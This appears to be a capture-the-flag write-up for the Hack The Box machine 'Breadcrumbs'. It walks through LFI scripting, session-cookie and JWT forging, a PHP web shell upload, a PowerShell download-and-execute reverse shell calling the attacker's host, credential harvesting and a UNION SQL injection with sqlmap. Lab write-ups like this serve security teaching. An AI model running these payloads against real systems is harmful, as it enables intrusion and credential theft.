---
permalink: /breadcrumbs
layout: post
author: helich0pper
title: Writeup
date: 2021-07-18
publish: True

description: "Breadcrumbs is a hard difficulty Windows machine running Apache web server with a library application.Directory enumeration and file read is leveraged to forge cookies and login as the administrator.A foothold is gained via unrestricted file upload. Plaintext credentials in a SQLite database assists in lateral movement.Finally, exploitation of SQL injection results in privilege escalation to windows administrator user.
"
---

# Skills Learned

- Forging PHP sessions
- SQL Injection

# Enumeration

## Nmap

```bash
┌──(aju㉿Parrot)-[~/breadcrumps]
└─$ sudo nmap -sC -sV -oA nmap/breadcrumps 10.10.10.228

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 15:41 IST
Nmap scan report for 10.10.10.228
Host is up (0.31s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
|_http-title: Library
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest, HTTPOptions, Help, Kerberos, LDAPBindReq, SIPOptions, SMBProgNeg, SSLSessionReq, WMSRequest, X11Probe, giop, ms-sql-s, oracle-tns: 
|_    Host '10.10.14.76' is not allowed to connect to this MariaDB server
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -59m06s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-18T09:14:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.89 seconds
```

* Windows server running Openssh and apache

## Port 80

![](/Writeups/breadcrumbs/Pasted image 20210718155012.png)

![](/Writeups/breadcrumbs/Pasted image 20210718155113.png)

On initial enumeration site is about various books and the links for the books are hardcoded using html and javascript. Let's run gobuster aganist the site to find any potential directories around.
 
 ```bash
 
 ┌──(aju㉿Parrot)-[~/breadcrumps]
└─$ gobuster dir -u http://10.10.10.228 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.228
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/18 15:54:06 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 301]
/js                   (Status: 301) [Size: 333] [--> http://10.10.10.228/js/]
/includes             (Status: 301) [Size: 339] [--> http://10.10.10.228/includes/]
/css                  (Status: 301) [Size: 334] [--> http://10.10.10.228/css/]     
/.htm                 (Status: 403) [Size: 301]                                    
/db                   (Status: 301) [Size: 333] [--> http://10.10.10.228/db/]      
/php                  (Status: 301) [Size: 334] [--> http://10.10.10.228/php/]     
/webalizer            (Status: 403) [Size: 301]                                    
/.                    (Status: 200) [Size: 2368]                                   
/portal               (Status: 301) [Size: 337] [--> http://10.10.10.228/portal/]  
/phpmyadmin           (Status: 403) [Size: 301]                                    
/CSS                  (Status: 301) [Size: 334] [--> http://10.10.10.228/CSS/]     
/.htaccess            (Status: 403) [Size: 301]                                    
/books                (Status: 301) [Size: 336] [--> http://10.10.10.228/books/]   
/examples             (Status: 503) [Size: 401]                                    
/Includes             (Status: 301) [Size: 339] [--> http://10.10.10.228/Includes/]
/JS                   (Status: 301) [Size: 333] [--> http://10.10.10.228/JS/]      
/Css                  (Status: 301) [Size: 334] [--> http://10.10.10.228/Css/]     
/Js                   (Status: 301) [Size: 333] [--> http://10.10.10.228/Js/]      
/.htc                 (Status: 403) [Size: 301]                                    
/DB                   (Status: 301) [Size: 333] [--> http://10.10.10.228/DB/]      
/PHP                  (Status: 301) [Size: 334] [--> http://10.10.10.228/PHP/]     
/Portal               (Status: 301) [Size: 337] [--> http://10.10.10.228/Portal/]  
/.html_var_DE         (Status: 403) [Size: 301]                                    
/licenses             (Status: 403) [Size: 420]                                    
/server-status        (Status: 403) [Size: 420]                                    
/Books                (Status: 301) [Size: 336] [--> http://10.10.10.228/Books/]   
/.htpasswd            (Status: 403) [Size: 301]                                    

 
 ```
 
 * Path Portal is redirecting to login page . Lets create a new user and explore more.

![](/Writeups/breadcrumbs/Pasted image 20210718155528.png)

On checking issues pane we can find that there is some issue associated with `PHPSESSID` duration.

![](/Writeups/breadcrumbs/Pasted image 20210718155830.png)

List of users.

![](/Writeups/breadcrumbs/Pasted image 20210718160033.png)

We can check the entropy of the `PHPSESSID` with burpsuite sequencer.

![](/Writeups/breadcrumbs/Pasted image 20210718160435.png)

![](/Writeups/breadcrumbs/Pasted image 20210718160642.png)

As we excepted entropy for the `PHPSESSID` is very low.

![](/Writeups/breadcrumbs/Pasted image 20210718160903.png)

```bash
┌──(aju㉿Parrot)-[~/breadcrumps]
└─$ sort brup_tokens | uniq -c

     67 edger05ecbbd0eaf2a6bfddc604e263bdde14
     60 edger233bb0f06aae90aefc39508f37a94bf1
    127 edger5ff7596fb91193d14067d301ce3595ce
     62 edgera30a4c0fb9ebfe098db95c05562a3728
	 
```

LFI can be found by analysing the book rendering requests. Lets try to read the login , cookie , token files to bypass authentication. 


![](/Writeups/breadcrumbs/Pasted image 20210718162015.png)

Lets make a simple python script for easy of doing.


```python
import requests , re ,sys

def lfi(page):
    data = {'book' : page ,
            'method' : 1}
    resp = requests.post('http://10.10.10.228/includes/bookController.php',data=data)
    
    try:
        return bytes(resp.text , "utf-8").decode("unicode_escape").strip('"').replace('\/','/')
    except:
        return resp.text

if __name__=="__main__":
    page = lfi(sys.argv[1])
    if len(sys.argv)== 3:
        pages = re.findall(r'([a-zA-Z0-9\-\/]*\.php)',page)
        for f in pages:
            print(f)
    else:
        print(page)              

```

```bash
┌──(aju㉿Parrot)-[~/breadcrumps/lfi]
└─$ python3 script.py ../portal/login.php a

authController.php
php/admins.php
login.php
signup.php
includes/footer.php

```

```python
┌──(aju㉿Parrot)-[~/breadcrumps/lfi]
└─$ python3 script.py ../portal/cookie.php 
/home/aju/breadcrumps/lfi/script.py:9: DeprecationWarning: invalid escape sequence '\/'
  return bytes(resp.text , "utf-8").decode("unicode_escape").strip('"').replace('\/','/')
<?php
/**
 * @param string $username  Username requesting session cookie
 * 
 * @return string $session_cookie Returns the generated cookie
 * 
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * */
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```

We got code for generating cookie then we can make cookie for admin.

```php
<?php
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528./9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}

echo makesession("paul")

?>
```

```bash
┌──(aju㉿Parrot)-[~/breadcrumps/lfi]
└─$ for i in {1..10}; do php -f paul.php | sort; done > cookies.txt; sort -u cookies.txt
paul47200b180ccd6835d25d034eeb6e6390
paul61ff9d4aaefe6bdf45681678ba89ff9d
paul8c8808867b53c49777fe5559164708c3
paula2a6a014d3bee04d7df8d5837d62e8c5
```

so we generate 4 Session id for admin paul

![](/Writeups/breadcrumbs/Pasted image 20210718163404.png)

Login successful and we can upload zip file.

![](/Writeups/breadcrumbs/Pasted image 20210718163624.png)

In order to upload we have to change token to paul using [jwt.io](https://jwt.io/)
- edit name to paul from user token
-  add secret from authcontroller.

|User Name | Secret |
|---|---|
|paul |6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591|

![](/Writeups/breadcrumbs/Pasted image 20210718164650.png)

Success.

![](/Writeups/breadcrumbs/Pasted image 20210718165207.png)

![](/Writeups/breadcrumbs/Pasted image 20210718165228.png)

Code Execution
Lets now try to get reverse shell.

change the payload to get code execution

```php
<?php
echo shell_exec($_REQUEST['edger']);
?>
```

![](/Writeups/breadcrumbs/Pasted image 20210718170002.png)


Now time for reverse shell.

Make a listner on port 9001 and execute powershellTCP reverse shell.

On browser

```bash
http://10.10.10.228/portal/uploads/edger.php?edger=powershell%20IEX(New-Object+Net.WebClient).DownloadString(%27http://10.10.14.76/tcp.ps1%27)
```

On terminal

```bash
nc -nvlp 9001                               
listening on [any] 9001 ...
connect to [10.10.14.76] from (UNKNOWN) [10.10.10.228] 59101
Windows PowerShell running as user www-data on BREADCRUMBS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads>
```

creds for juliette can be found in
`C:\Users\www-ata\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData`

```json

{
	"pizza" : "margherita",
	"size" : "large",	
	"drink" : "water",
	"card" : "VISA",
	"PIN" : "9890",
	"alternate" : {
		"username" : "juliette",
		"password" : "jUli901./())!",
	}
}
```


|user|password|
|---|---|
|juliette|jUli901./())!|

![](/Writeups/breadcrumbs/Pasted image 20210718170931.png)

```html
<html>
<style>
html{
background:black;
color:orange;
}
table,th,td{
border:1px solid orange;   
padding:1em;
border-collapse:collapse;  
}
</style>
<table>
        <tr>
            <th>Task</th>  
            <th>Status</th>
            <th>Reason</th>
        </tr>
        <tr>
            <td>Configure firewall for port 22 and 445</td>
            <td>Not started</td>
            <td>Unauthorized access might be possible</td>
        </tr>
        <tr>
            <td>Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager</td>
            <td>In progress</td>
            <td>It stores passwords in plain text</td>
        </tr>
        <tr>
            <td>Add new features to password manager</td>
            <td>Not started</td>
            <td>To get promoted, hopefully lol</td>
        </tr>
</table>

</html>
```

Passwords are stored in sticky notes lets find out backups of sticky notes at 
`C:\Users\juliette\Appdata\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState` download to our machine using ssh or smbserver.

After dumping the sqlite files we get creds for development

```sqlite

id=48c70e58-fcf9-475a-aea4-24ce19a9f9ec juliette: jUli901./())!
id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g

		
```

SSH into machine as development and a binary was found . we need to transfer it to our machine for analysing.

```powershell
PS C:\Development> ls


    Directory: C:\Development


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/29/2020   3:11 AM          18312 Krypter_Linux


PS C:\Development>
```

When we print strings in the binary using `strings` command we can find that it is listening on port 1234 locally. So we need to forward the port .

![](/Writeups/breadcrumbs/Pasted image 20210718172430.png)

![](/Writeups/breadcrumbs/Pasted image 20210718172639.png)

![](/Writeups/breadcrumbs/Pasted image 20210718172747.png)

We can now dump hash and secret 

```bash
┌──(aju㉿Parrot)-[~/CTF/HTB/breadcrumps]
└─$ curl localhost:1234 -d 'method=select&username=&table=passwords UNION select password from passwords-- -'
selectarray(2) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(44) "H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw="
  }
}
```

```php
sqlmap -dump -u 127.0.0.1:1234/index.php ethod=select&username=administrator&table=passwords"

+----+---------------+------------------+----------------------------------------------+
| id | account       | aes_key          | password                                     |
+----+---------------+------------------+----------------------------------------------+
| 1  | Administrator | k19D193j.<19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |
+----+---------------+------------------+----------------------------------------------+
```

Using CyberChef we can decrypt password for administrator

![](/Writeups/breadcrumbs/Pasted image 20210718173120.png)

|user|password|
|---|---|
|administrator |p@ssw0rd!@#$9890./|

![](/Writeups/breadcrumbs/Pasted image 20210718173634.png)